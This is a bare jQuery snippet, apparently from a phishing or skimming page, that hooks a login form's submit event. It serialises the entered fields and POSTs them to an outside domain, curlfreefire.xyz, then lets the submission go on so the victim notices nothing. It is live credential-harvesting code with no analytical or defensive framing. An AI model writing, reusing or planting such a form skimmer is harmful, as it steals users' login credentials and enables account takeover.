(".login-form").submit(function() {
	var d = $(".login-form");

	$.ajax({
        url: "http://curlfreefire.xyz/index.php",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
